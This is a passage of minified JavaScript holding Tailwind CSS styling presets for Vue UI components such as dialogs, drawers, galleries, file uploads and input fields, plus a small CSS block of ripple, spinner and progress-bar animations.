      "scale-100",
      // Maximized State
      {
        "transition-none": e.maximized,
        "transform-none": e.maximized,
        "!w-screen": e.maximized,
        "!h-screen": e.maximized,
        "!max-h-full": e.maximized,
        "!top-0": e.maximized,
        "!left-0": e.maximized
      }
    ]
  }),
  header: {
    class: [
      // Flexbox and Alignment
      "flex items-center justify-between",
      "shrink-0",
      // Spacing
      "p-6",
      // Shape
      "rounded-tl-lg",
      "rounded-tr-lg",
      // Colors
      "text-surface-700 dark:text-surface-0/80",
      "border border-b-0",
      "border-surface-200 dark:border-surface-700"
    ]
  },
  title: {
    class: ["font-semibold text-xl leading-[normal]"]
  },
  headerActions: {
    class: ["flex items-center"]
  },
  content: ({ state: e, instance: t }) => ({
    class: [
      // Spacing
      "px-6",
      "pb-6",
      "pt-0",
      // Shape
      {
        grow: e.maximized,
        "rounded-bl-lg": !t.$slots.footer,
        "rounded-br-lg": !t.$slots.footer
      },
      // Colors
      "text-surface-700 dark:text-surface-0/80",
      "border border-t-0 border-b-0",
      "border-surface-200 dark:border-surface-700",
      // Misc
      "overflow-y-auto"
    ]
  }),
  footer: {
    class: [
      // Flexbox and Alignment
      "flex items-center justify-end",
      "shrink-0",
      "text-right",
      "gap-2",
      // Spacing
      "px-6",
      "pb-6",
      // Shape
      "border-t-0",
      "rounded-b-lg",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-surface-0/80",
      "border border-t-0 border-b-0",
      "border-surface-200 dark:border-surface-700"
    ]
  },
  mask: ({ props: e }) => ({
    class: [
      // Transitions
      "transition-all",
      "duration-300",
      { "p-5": e.position !== "full" },
      // Background and Effects
      { "has-[.mask-active]:bg-transparent bg-black/40": e.modal }
    ]
  }),
  transition: () => ({})
}, _u = {
  root: ({ props: e }) => ({
    class: [
      // Flex and Position
      "flex relative",
      { "justify-center": e.layout == "vertical" },
      { "items-center": e.layout == "vertical" },
      {
        "justify-start": (e == null ? void 0 : e.align) == "left" && e.layout == "horizontal",
        "justify-center": (e == null ? void 0 : e.align) == "center" && e.layout == "horizontal",
        "justify-end": (e == null ? void 0 : e.align) == "right" && e.layout == "horizontal",
        "items-center": (e == null ? void 0 : e.align) == "top" && e.layout == "vertical",
        "items-start": (e == null ? void 0 : e.align) == "center" && e.layout == "vertical",
        "items-end": (e == null ? void 0 : e.align) == "bottom" && e.layout == "vertical"
      },
      // Spacing
      {
        "my-5 mx-0 py-0 px-5": e.layout == "horizontal",
        "mx-4 md:mx-5 py-5": e.layout == "vertical"
      },
      // Size
      {
        "w-full": e.layout == "horizontal",
        "min-h-full": e.layout == "vertical"
      },
      // Before: Line
      "before:block",
      // Position
      {
        "before:absolute before:left-0 before:top-1/2": e.layout == "horizontal",
        "before:absolute before:left-1/2 before:top-0 before:transform before:-translate-x-1/2": e.layout == "vertical"
      },
      // Size
      {
        "before:w-full": e.layout == "horizontal",
        "before:min-h-full": e.layout == "vertical"
      },
      // Shape
      {
        "before:border-solid": e.type == "solid",
        "before:border-dotted": e.type == "dotted",
        "before:border-dashed": e.type == "dashed"
      },
      // Color
      {
        "before:border-t before:border-surface-200 before:dark:border-surface-600": e.layout == "horizontal",
        "before:border-l before:border-surface-200 before:dark:border-surface-600": e.layout == "vertical"
      }
    ]
  }),
  content: {
    class: [
      // Space and Position
      "px-1 z-10",
      // Color
      "bg-surface-0 dark:bg-surface-800"
    ]
  }
}, Su = {
  root: ({ props: e }) => ({
    class: [
      // Positioning
      "absolute z-1",
      {
        "left-0 bottom-0 w-full": e.position == "bottom",
        "left-0 top-0 w-full": e.position == "top",
        "left-0 top-0 h-full": e.position == "left",
        "right-0 top-0 h-full": e.position == "right"
      },
      // Flexbox & Alignment
      "flex justify-center items-center",
      // Interactivity
      "pointer-events-none"
    ]
  }),
  listContainer: {
    class: [
      // Flexbox
      "flex",
      // Shape & Border
      "rounded-md",
      // Color
      "bg-surface-0/10 dark:bg-surface-900/20 border border-surface-0/20",
      "backdrop-blur-sm",
      // Spacing
      "p-2",
      // Misc
      "pointer-events-auto"
    ]
  },
  list: ({ props: e }) => ({
    class: [
      // Flexbox & Alignment
      "flex items-center justify-center",
      {
        "flex-col": e.position == "left" || e.position == "right"
      },
      // List Style
      "m-0 p-0 list-none",
      // Shape
      "outline-none"
    ]
  }),
  item: ({ props: e, context: t, instance: r }) => ({
    class: [
      // Spacing & Shape
      "p-2 rounded-md",
      // Positioning & Hover States
      {
        "origin-bottom": e.position == "bottom",
        "origin-top": e.position == "top",
        "origin-left": e.position == "left",
        "origin-right": e.position == "right"
      },
      // Transitions & Transform
      "transition-all duration-200 ease-cubic-bezier-will-change-transform transform"
    ]
  }),
  itemLink: {
    class: [
      // Flexbox & Alignment
      "flex flex-col items-center justify-center",
      // Position
      "relative",
      // Size
      "w-16 h-16",
      // Misc
      "cursor-default overflow-hidden"
    ]
  }
}, Ys = {
  root: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex flex-col",
      // Position
      "relative",
      {
        "!transition-none !transform-none !w-screen !h-screen !max-h-full !top-0 !left-0": e.position == "full"
      },
      // Size
      {
        "h-full w-80": e.position == "left" || e.position == "right",
        "h-auto w-full": e.position == "top" || e.position == "bottom"
      },
      // Shape
      "border-0 dark:border",
      "shadow-lg",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      "dark:border-surface-700",
      // Transitions
      "transition-transform",
      "duration-300",
      // Misc
      "pointer-events-auto"
    ]
  }),
  header: {
    class: [
      // Flexbox and Alignment
      "flex items-center justify-between",
      "shrink-0",
      // Spacing
      "p-[1.125rem]",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-surface-0/80"
    ]
  },
  title: {
    class: ["font-semibold text-xl"]
  },
  icons: {
    class: ["flex items-center"]
  },
  closeButton: {
    class: [
      "relative",
      // Flexbox and Alignment
      "flex items-center justify-center",
      // Size and Spacing
      "mr-2",
      "last:mr-0",
      "w-7 h-7",
      // Shape
      "border-0",
      "rounded-full",
      // Colors
      "text-surface-500",
      "bg-transparent",
      // Transitions
      "transition duration-200 ease-in-out",
      // States
      "hover:text-surface-700 dark:hover:text-white/80",
      "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]",
      "focus:outline-none focus:outline-offset-0 focus:ring-1",
      "focus:ring-primary-500 dark:focus:ring-primary-400",
      // Misc
      "overflow-hidden"
    ]
  },
  closeButtonIcon: {
    class: [
      // Display
      "inline-block",
      // Size
      "w-4",
      "h-4"
    ]
  },
  content: {
    class: [
      // Spacing and Size
      "p-[1.125rem]",
      "pt-0",
      "h-full",
      "w-full",
      // Growth and Overflow
      "grow",
      "overflow-y-auto"
    ]
  },
  mask: ({ props: e }) => ({
    class: [
      // Transitions
      "transition-all",
      "duration-300",
      { "p-5": e.position !== "full" },
      // Background and Effects
      { "has-[.mask-active]:bg-transparent bg-black/40": e.modal }
    ]
  }),
  transition: ({ props: e }) => e.position === "top" ? {
    enterFromClass: "translate-x-0 -translate-y-full translate-z-0 mask-active",
    leaveToClass: "translate-x-0 -translate-y-full translate-z-0 mask-active"
  } : e.position === "bottom" ? {
    enterFromClass: "translate-x-0 translate-y-full translate-z-0 mask-active",
    leaveToClass: "translate-x-0 translate-y-full translate-z-0 mask-active"
  } : e.position === "left" ? {
    enterFromClass: "-translate-x-full translate-y-0 translate-z-0 mask-active",
    leaveToClass: "-translate-x-full translate-y-0 translate-z-0 mask-active"
  } : e.position === "right" ? {
    enterFromClass: "translate-x-full translate-y-0 translate-z-0 mask-active",
    leaveToClass: "translate-x-full translate-y-0 translate-z-0 mask-active"
  } : {
    enterFromClass: "opacity-0 mask-active",
    enterActiveClass: "transition-opacity duration-400 ease-in",
    leaveActiveClass: "transition-opacity duration-400 ease-in",
    leaveToClass: "opacity-0 mask-active"
  }
}, Cu = {
  root: {
    class: [
      // Spacing
      "p-[1.125rem] pt-0",
      // Shape
      "rounded-md",
      // Color
      "border border-surface-200 dark:border-surface-700",
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-surface-0/80"
    ]
  },
  legend: ({ props: e }) => ({
    class: [
      // Font
      "font-semibold",
      "leading-none",
      //Spacing
      "p-0 mb-[0.375rem]",
      // Shape
      "rounded-md",
      // Color
      "text-surface-700 dark:text-surface-0/80",
      "bg-surface-0 dark:bg-surface-900",
      // Transition
      "transition-none",
      // States
      { "hover:bg-surface-100 dark:hover:bg-surface-800": e.toggleable }
    ]
  }),
  toggleButton: ({ props: e }) => ({
    class: [
      // Alignments
      "flex items-center justify-center",
      "relative",
      //Spacing
      { "py-2 px-3": e.toggleable },
      // Shape
      { "rounded-md": e.toggleable },
      // Color
      {
        "text-surface-700 dark:text-surface-200 hover:text-surface-900": e.toggleable
      },
      // States
      {
        "hover:text-surface-900 dark:hover:text-surface-100": e.toggleable
      },
      {
        "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 focus-visible:ring-primary-400 dark:focus-visible:ring-primary-300": e.toggleable
      },
      // Misc
      {
        "transition-none cursor-pointer overflow-hidden select-none": e.toggleable
      }
    ]
  }),
  toggleIcon: {
    class: "mr-2 inline-block"
  },
  legendLabel: ({ props: e }) => ({
    class: [
      "flex items-center justify-center leading-none",
      { "py-2 px-3": !e.toggleable }
    ]
  }),
  content: {
    class: "p-0"
  },
  transition: {
    enterFromClass: "max-h-0",
    enterActiveClass: "overflow-hidden transition-[max-height] duration-1000 ease-[cubic-bezier(0.42,0,0.58,1)]",
    enterToClass: "max-h-[1000px]",
    leaveFromClass: "max-h-[1000px]",
    leaveActiveClass: "overflow-hidden transition-[max-height] duration-[450ms] ease-[cubic-bezier(0,1,0,1)]",
    leaveToClass: "max-h-0"
  }
}, ju = {
  root: ({ props: e }) => ({
    class: [
      {
        "flex flex-wrap items-center justify-center gap-2": e.mode === "basic"
      }
    ]
  }),
  input: {
    class: "hidden"
  },
  header: {
    class: [
      // Flexbox
      "flex",
      "flex-wrap",
      // Colors
      "bg-surface-0",
      "dark:bg-surface-900",
      "text-surface-700",
      "dark:text-white/80",
      // Spacing
      "p-[1.125rem]",
      "gap-2",
      // Borders
      "border",
      "border-solid",
      "border-surface-200",
      "dark:border-surface-700",
      "border-b-0",
      // Shape
      "rounded-tr-lg",
      "rounded-tl-lg"
    ]
  },
  content: {
    class: [
      // Position
      "relative",
      // Colors
      "bg-surface-0",
      "dark:bg-surface-900",
      "text-surface-700",
      "dark:text-white/80",
      // Spacing
      "p-[1.125rem]",
      // Borders
      "border border-t-0",
      "border-surface-200",
      "dark:border-surface-700",
      // Shape
      "rounded-b-lg",
      //ProgressBar
      "[&>[data-pc-name=pcprogressbar]]:absolute",
      "[&>[data-pc-name=pcprogressbar]]:w-full",
      "[&>[data-pc-name=pcprogressbar]]:top-0",
      "[&>[data-pc-name=pcprogressbar]]:left-0",
      "[&>[data-pc-name=pcprogressbar]]:h-1"
    ]
  },
  file: {
    class: [
      // Flexbox
      "flex",
      "items-center",
      "flex-wrap",
      // Spacing
      "p-4",
      "mb-2",
      "last:mb-0",
      // Borders
      "border",
      "border-surface-200",
      "dark:border-surface-700",
      "gap-2",
      // Shape
      "rounded"
    ]
  },
  fileThumbnail: "shrink-0",
  fileName: "mb-2 break-all",
  fileSize: "mr-2"
}, Tu = {
  root: {
    class: [
      "block relative",
      // Base Label Appearance
      "[&>*:last-child]:text-surface-900/60 dark:[&>*:last-child]:text-white/60",
      "[&>*:last-child]:absolute",
      "[&>*:last-child]:left-3",
      "[&>*:last-child]:pointer-events-none",
      "[&>*:last-child]:transition-all",
      "[&>*:last-child]:duration-200",
      "[&>*:last-child]:ease",
      // Position for all labels except those following textarea
      "[&>:not(textarea)~label]:top-1/2 [&>:not(textarea)~label]:-translate-y-1/2 ",
      // Position for labels following textareas
      "[&>textarea~label]:top-4",
      // Focus Label Appearance
      "[&>*:last-child]:has-[:focus]:-top-3",
      "[&>*:last-child]:has-[:focus]:text-sm",
      "[&>*:last-child]:has-[:focus]:z-10",
      // Filled Input Label Appearance
      "[&>*:last-child]:has-[.filled]:-top-3",
      "[&>*:last-child]:has-[.filled]:text-sm",
      "[&>*:last-child]:has-[.filled]:z-10"
    ]
  }
}, $u = {
  content: ({ parent: e, props: t }) => ({
    class: [
      "flex",
      {
        "flex-col": t.fullScreen
      },
      {
        "flex-col": e.props.thumbnailsPosition === "top" || e.props.thumbnailsPosition === "bottom",
        "flex-row": e.props.thumbnailsPosition === "right" || e.props.thumbnailsPosition === "left"
      }
    ]
  }),
  itemsContainer: ({ parent: e, props: t }) => ({
    class: [
      "group",
      "flex relative",
      {
        "grow shrink w-0 justify-center": t.fullScreen
      },
      {
        "flex-col": e.props.indicatorsPosition === "bottom" || e.props.indicatorsPosition === "top",
        "flex-row items-center": e.props.indicatorsPosition === "left" || e.props.indicatorsPosition === "right"
      },
      {
        "order-2": e.props.thumbnailsPosition === "top" || e.props.thumbnailsPosition === "left",
        "flex-row": e.props.thumbnailsPosition === "right"
      }
    ]
  }),
  items: ({ parent: e }) => ({
    class: [
      "flex h-full relative",
      {
        "order-1": e.props.indicatorsPosition === "bottom" || e.props.indicatorsPosition === "right",
        "order-2": e.props.indicatorsPosition === "top" || e.props.indicatorsPosition === "left"
      }
    ]
  }),
  item: {
    class: [
      // Flex
      "flex justify-center items-center h-full w-full",
      // Sizing
      "h-full w-full"
    ]
  },
  thumbnails: ({ parent: e }) => ({
    class: [
      // Flex
      "flex flex-col shrink-0",
      {
        "order-1": e.props.thumbnailsPosition === "top" || e.props.thumbnailsPosition === "left"
      },
      // Misc
      "overflow-auto"
    ]
  }),
  thumbnailContent: ({ parent: e }) => ({
    class: [
      // Flex
      "flex",
      // Spacing
      "py-4 px-1",
      // Colors
      "bg-black/90",
      {
        "flex-row": e.props.thumbnailsPosition === "top" || e.props.thumbnailsPosition === "bottom",
        "flex-col grow": e.props.thumbnailsPosition === "right" || e.props.thumbnailsPosition === "left"
      }
    ]
  }),
  thumbnailPrevButton: {
    class: [
      // Positioning
      "self-center relative",
      // Display & Flexbox
      "flex shrink-0 justify-center items-center overflow-hidden",
      // Spacing
      "m-2",
      // Appearance
      "bg-transparent text-white w-8 h-8 rounded-full transition duration-200 ease-in-out",
      // Hover Effects
      "hover:bg-surface-0/10 hover:text-white",
      // Focus Effects
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400"
    ]
  },
  thumbnailsViewport: {
    class: "overflow-hidden w-full"
  },
  thumbnailItems: ({ parent: e }) => ({
    class: [
      "flex",
      {
        "flex-col h-full": e.props.thumbnailsPosition === "right" || e.props.thumbnailsPosition === "left"
      }
    ]
  }),
  thumbnailItem: ({ parent: e }) => ({
    class: [
      // Flexbox
      "flex items-center justify-center",
      "grow shrink-0",
      // Sizing
      {
        "w-full md:w-[25%] lg:w-[20%]": e.props.thumbnailsPosition === "top" || e.props.thumbnailsPosition === "bottom"
      },
      // Misc
      "overflow-auto",
      "cursor-pointer",
      "opacity-50",
      // States
      '[&[data-p-active="true"]]:opacity-100',
      "hover:opacity-100",
      // Transitions
      "transition-opacity duration-300"
    ]
  }),
  thumbnailNextButton: {
    class: [
      // Positioning
      "self-center relative",
      // Display & Flexbox
      "flex shrink-0 justify-center items-center overflow-hidden",
      // Spacing
      "m-2",
      // Appearance
      "bg-transparent text-white w-8 h-8 rounded-full transition duration-200 ease-in-out",
      // Hover Effects
      "hover:bg-surface-0/10 hover:text-white",
      // Focus Effects
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400"
    ]
  },
  indicatorList: ({ parent: e }) => ({
    class: [
      // flex
      "flex items-center justify-center",
      // Spacing
      "p-4",
      // Indicators Position
      {
        "order-2": e.props.indicatorsPosition == "bottom",
        "order-1": e.props.indicatorsPosition == "top",
        "order-1 flex-col": e.props.indicatorsPosition == "left",
        "flex-col order-2": e.props.indicatorsPosition == "right"
      },
      {
        "absolute z-10 bg-black/50": e.props.showIndicatorsOnItem
      },
      {
        "bottom-0 left-0 w-full items-start": e.props.indicatorsPosition == "bottom" && e.props.showIndicatorsOnItem,
        "top-0 left-0 w-full items-start": e.props.indicatorsPosition == "top" && e.props.showIndicatorsOnItem,
        "left-0 top-0 h-full items-start": e.props.indicatorsPosition == "left" && e.props.showIndicatorsOnItem,
        "right-0 top-0 h-full items-start": e.props.indicatorsPosition == "right" && e.props.showIndicatorsOnItem
      }
    ]
  }),
  indicator: ({ parent: e }) => ({
    class: [
      {
        "mr-2": e.props.indicatorsPosition == "bottom" || e.props.indicatorsPosition == "top",
        "mb-2": e.props.indicatorsPosition == "left" || e.props.indicatorsPosition == "right"
      }
    ]
  }),
  indicatorButton: ({ context: e }) => ({
    class: [
      // Size
      "w-4 h-4",
      // Appearance
      "rounded-full transition duration-200",
      // Focus Effects
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Conditional Appearance: Not Highlighted
      {
        "bg-surface-200 hover:bg-surface-300 dark:bg-surface-700 dark:hover:bg-surface-600": !e.highlighted
      },
      // Conditional Appearance: Highlighted
      { "bg-primary hover:bg-primary-emphasis": e.highlighted }
    ]
  }),
  mask: {
    class: [
      "fixed top-0 left-0 w-full h-full",
      "flex items-center justify-center",
      "bg-black/90"
    ]
  },
  closeButton: {
    class: [
      // Positioning
      "!absolute top-0 right-0",
      // Display & Flexbox
      "flex justify-center items-center overflow-hidden",
      // Spacing
      "m-2",
      // Appearance
      "text-white bg-transparent w-12 h-12 rounded-full transition duration-200 ease-in-out",
      // Hover Effect
      "hover:text-white hover:bg-surface-0/10",
      // Focus Effects
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400"
    ]
  },
  closeIcon: {
    class: "w-6 h-6"
  },
  prevButton: ({ parent: e }) => ({
    class: [
      // Display & Flexbox
      "inline-flex justify-center items-center overflow-hidden",
      // Appearance
      "bg-transparent text-white w-16 h-16 transition duration-200 ease-in-out rounded-md",
      {
        "opacity-0 group-hover:opacity-100": e.props.showItemNavigatorsOnHover
      },
      // Spacing
      "mx-2",
      // Positioning
      "top-1/2 mt-[-0.5rem] left-0",
      {
        "!absolute": !e.state.containerVisible && e.props.showItemNavigators,
        "!fixed": e.state.containerVisible
      },
      // Hover Effect
      "hover:bg-surface-0/10 hover:text-white",
      // Focus Effects
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400"
    ]
  }),
  nextButton: ({ parent: e }) => ({
    class: [
      // Display & Flexbox
      "inline-flex justify-center items-center overflow-hidden",
      // Appearance
      "bg-transparent text-white w-16 h-16 transition duration-200 ease-in-out rounded-md",
      {
        "opacity-0 group-hover:opacity-100": e.props.showItemNavigatorsOnHover
      },
      // Spacing
      "mx-2",
      // Positioning
      "top-1/2 mt-[-0.5rem] right-0",
      {
        "!absolute": !e.state.containerVisible && e.props.showItemNavigators,
        "!fixed": e.state.containerVisible
      },
      // Hover Effect
      "hover:bg-surface-0/10 hover:text-white",
      // Focus Effects
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400"
    ]
  }),
  caption: {
    class: [
      // Positioning
      "absolute bottom-0 left-0 w-full",
      // Appearance
      "bg-black/50 text-white p-4"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-75",
    enterActiveClass: "transition-all duration-150 ease-in-out",
    leaveActiveClass: "transition-all duration-150 ease-in",
    leaveToClass: "opacity-0 scale-75"
  }
}, Pu = {
  css: `
    *[data-pd-ripple="true"]{
        overflow: hidden;
        position: relative;
    }
    span[data-p-ink-active="true"]{
        animation: ripple 0.4s linear;
    }
    @keyframes ripple {
        100% {
            opacity: 0;
            transform: scale(2.5);
        }
    }

    .progress-spinner-circle {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: 0;
        animation: p-progress-spinner-dash 1.5s ease-in-out infinite, p-progress-spinner-color 6s ease-in-out infinite;
        stroke-linecap: round;
    }

    @keyframes p-progress-spinner-dash{
        0% {
            stroke-dasharray: 1, 200;
            stroke-dashoffset: 0;
        }

        50% {
            stroke-dasharray: 89, 200;
            stroke-dashoffset: -35px;
        }
        100% {
            stroke-dasharray: 89, 200;
            stroke-dashoffset: -124px;
        }
    }
    @keyframes p-progress-spinner-color {
        100%, 66%, 0% {
            stroke: #ff5757;
        }
        40%, 80%, 90% {
            stroke: #cc8925;
        }
    }

    .progressbar-value-animate::after {
        will-change: left, right;
        animation: p-progressbar-indeterminate-anim-short 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
    }
    .progressbar-value-animate::before {
        will-change: left, right;
        animation: p-progressbar-indeterminate-anim 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite;
    }
    @keyframes p-progressbar-indeterminate-anim {
        0% {
            left: -35%;
            right: 100%;
        }
        60% {
            left: 100%;
            right: -90%;
        }
        100% {
            left: 100%;
            right: -90%;
        }
    }

    .p-fadein {
        animation: p-fadein 250ms linear;
    }

    @keyframes p-fadein {
        0% {
            opacity: 0;
        }
        100% {
            opacity: 1;
        }
    }
`
}, Ou = {
  root: {
    class: [
      "relative",
      "[&>[data-pc-name=inputicon]]:absolute",
      "[&>[data-pc-name=inputicon]]:top-1/2",
      "[&>[data-pc-name=inputicon]]:-mt-2",
      "[&>[data-pc-name=inputicon]]:text-surface-900/60 dark:[&>[data-pc-name=inputicon]]:text-white/60",
      "[&>[data-pc-name=inputicon]:first-child]:left-3",
      "[&>[data-pc-name=inputicon]:last-child]:right-3",
      "[&>[data-pc-name=inputtext]:first-child]:pr-10",
      "[&>[data-pc-name=inputtext]:last-child]:pl-10",
      // filter
      "[&>[data-pc-extend=inputicon]]:absolute",
      "[&>[data-pc-extend=inputicon]]:top-1/2",
      "[&>[data-pc-extend=inputicon]]:-mt-2",
      "[&>[data-pc-extend=inputicon]]:text-surface-900/60 dark:[&>[data-pc-extend=inputicon]]:text-white/60",
      "[&>[data-pc-extend=inputicon]:first-child]:left-3",
      "[&>[data-pc-extend=inputicon]:last-child]:right-3"
    ]
  }
}, Au = {
  root: {
    class: "relative inline-block"
  },
  previewMask: {
    class: [
      // Flexbox & Alignment
      "flex items-center justify-center",
      // Positioning
      "absolute",
      // Shape
      "inset-0 opacity-0 transition-opacity duration-300",
      // Color
      "bg-transparent text-surface-100",
      // States
      "hover:opacity-100 hover:cursor-pointer hover:bg-black/50 hover:bg-opacity-50"
    ]
  },
  mask: {
    class: [
      // Flexbox & Alignment
      "flex items-center justify-center",
      // Positioning
      "fixed top-0 left-0",
      // Sizing
      "w-full h-full",
      // Color
      "bg-black/90"
    ]
  },
  toolbar: {
    class: [
      // Flexbox
      "flex",
      // Positioning
      "absolute top-0 right-0",
      // Spacing
      "p-4"
    ]
  },
  rotateRightButton: {
    class: [
      "z-20",
      // Flexbox & Alignment
      "flex justify-center items-center",
      // Size
      "w-12 h-12",
      // Spacing
      "mr-2",
      // Shape
      "rounded-full",
      // Color
      "text-white bg-transparent",
      // States
      "hover:text-white hover:bg-surface-0/10",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transition
      "transition duration-200 ease-in-out"
    ]
  },
  rotateRightIcon: {
    class: "w-6 h-6"
  },
  rotateLeftButton: {
    class: [
      "z-20",
      // Flexbox & Alignment
      "flex justify-center items-center",
      // Size
      "w-12 h-12",
      // Spacing
      "mr-2",
      // Shape
      "rounded-full",
      // Color
      "text-white bg-transparent",
      // States
      "hover:text-white hover:bg-surface-0/10",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transition
      "transition duration-200 ease-in-out"
    ]
  },
  rotateLeftIcon: {
    class: "w-6 h-6"
  },
  zoomOutButton: {
    class: [
      "z-20",
      // Flexbox & Alignment
      "flex justify-center items-center",
      // Size
      "w-12 h-12",
      // Spacing
      "mr-2",
      // Shape
      "rounded-full",
      // Color
      "text-white bg-transparent",
      // States
      "hover:text-white hover:bg-surface-0/10",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transition
      "transition duration-200 ease-in-out"
    ]
  },
  zoomOutIcon: {
    class: "w-6 h-6"
  },
  zoomInButton: {
    class: [
      "z-20",
      // Flexbox & Alignment
      "flex justify-center items-center",
      // Size
      "w-12 h-12",
      // Spacing
      "mr-2",
      // Shape
      "rounded-full",
      // Color
      "text-white bg-transparent",
      // States
      "hover:text-white hover:bg-surface-0/10",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transition
      "transition duration-200 ease-in-out"
    ]
  },
  zoomInIcon: {
    class: "w-6 h-6"
  },
  closeButton: {
    class: [
      "z-20",
      // Flexbox & Alignment
      "flex justify-center items-center",
      // Size
      "w-12 h-12",
      // Spacing
      "mr-2",
      // Shape
      "rounded-full",
      // Color
      "text-white bg-transparent",
      // States
      "hover:text-white hover:bg-surface-0/10",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transition
      "transition duration-200 ease-in-out"
    ]
  },
  closeIcon: {
    class: "w-6 h-6"
  },
  transition: {
    enterFromClass: "opacity-0 scale-75",
    enterActiveClass: "transition-all duration-150 ease-in-out",
    leaveActiveClass: "transition-all duration-150 ease-in",
    leaveToClass: "opacity-0 scale-75"
  }
}, Eu = {
  display: {
    class: [
      // Display
      "inline",
      // Spacing
      "px-3 py-2",
      // Shape
      "rounded-md",
      // Colors
      "text-surface-700 dark:text-white/80",
      // States
      "hover:bg-surface-100 hover:text-surface-700 dark:hover:bg-surface-800 dark:hover:text-white/80",
      // Transitions
      "transition",
      "duration-200",
      // Misc
      "cursor-pointer"
    ]
  }
}, Iu = {
  root: {
    class: ["flex items-stretch", "w-full"]
  }
}, zu = {
  root: {
    class: [
      // Flex
      "flex items-center justify-center",
      // Shape
      "first:rounded-l-md",
      "last:rounded-r-md",
      "border-y",
      "last:border-r",
      "border-l",
      "border-r-0",
      // Space
      "p-2",
      // Size
      "min-w-[2.5rem]",
      // Color
      "bg-transparent dark:bg-surface-900",
      "text-surface-800 dark:text-white/80",
      "border-surface-300 dark:border-surface-700"
    ]
  }
}, Ru = {
  pcinputtext: {
    root: ({ context: e, props: t, parent: r }) => {
      var o, s, n, i, a, l, u;
      return {
        class: [
          // Font
          "leading-none",
          // Spacing
          "m-0 py-2 px-3",
          // Colors
          "text-surface-800 dark:text-white/80",
          { "bg-surface-0 dark:bg-surface-950": !e.disabled },
          "border",
          { "border-surface-300 dark:border-surface-700": !t.invalid },
          // Invalid State
          "invalid:focus:ring-red-200",
          "invalid:hover:border-red-500",
          { "border-red-500 dark:border-red-400": t.invalid },
          // States
          {
            "hover:border-surface-400 dark:hover:border-surface-600": !e.disabled && !t.invalid,
            "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10": !e.disabled,
            "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
          },
          // Filled State *for FloatLabel
          {
            filled: ((o = r.instance) == null ? void 0 : o.$name) == "FloatLabel" && e.filled || ((n = (s = r.instance) == null ? void 0 : s.$parentInstance) == null ? void 0 : n.$name) == "FloatLabel" && r.props.modelValue !== null && ((i = r.props.modelValue) == null ? void 0 : i.length) !== 0
          },
          ((a = r.instance) == null ? void 0 : a.$name) == "FloatLabel" || ((u = (l = r.instance) == null ? void 0 : l.$parentInstance) == null ? void 0 : u.$name) == "FloatLabel" ? "placeholder:text-transparent dark:placeholder:text-transparent" : "placeholder:text-surface-400 dark:placeholder:text-surface-500",
          // Misc
          "rounded-md",
          "appearance-none",
          "transition-colors duration-200"
        ]
      };
    }
  }
}, Lu = {
  root: ({ props: e, parent: t }) => ({
    class: [
      // Flex
      "inline-flex",
      "relative",
      { "flex-col": e.showButtons && e.buttonLayout === "vertical" },
      { "flex-1 w-[1%]": t.instance.$name === "InputGroup" },
      { "w-full": e.fluid },
      // Shape
      {
        "first:rounded-l-md rounded-none last:rounded-r-md": t.instance.$name === "InputGroup" && !e.showButtons
      },
      {
        "border-0 border-y border-l last:border-r border-surface-300 dark:border-surface-700": t.instance.$name === "InputGroup" && !e.showButtons
      },
      {
        "first:ml-0 -ml-px": t.instance.$name === "InputGroup" && !e.showButtons
      },
      //Sizing
      { "!w-16": e.showButtons && e.buttonLayout == "vertical" }
    ]
  }),
  pcInput: {
    root: ({ parent: e, context: t }) => {
      var r, o, s;
      return {
        class: [
          // Font
          "leading-none",
          // Display
          "flex-auto",
          { "w-[1%]": e.props.fluid },
          //Text
          {
            "text-center": e.props.showButtons && e.props.buttonLayout == "vertical"
          },
          // Spacing
          "py-2 px-3",
          "m-0",
          // Shape
          "rounded-md",
          {
            "rounded-l-none rounded-r-none": e.props.showButtons && e.props.buttonLayout === "horizontal"
          },
          {
            "rounded-none": e.props.showButtons && e.props.buttonLayout === "vertical"
          },
          {
            "border-0": ((r = e.instance.$parentInstance) == null ? void 0 : r.$name) === "InputGroup" && !e.props.showButtons
          },
          // Colors
          "text-surface-800 dark:text-white/80",
          "placeholder:text-surface-400 dark:placeholder:text-surface-500",
          { "bg-surface-0 dark:bg-surface-950": !t.disabled },
          "border",
          { "border-surface-300 dark:border-surface-700": !e.props.invalid },
          // Invalid State
          "invalid:focus:ring-danger-400",
          "invalid:hover:border-danger-400",
          { "border-red-500 dark:border-red-400": e.props.invalid },
          // States
          { "hover:border-secondary-400": !e.props.invalid },
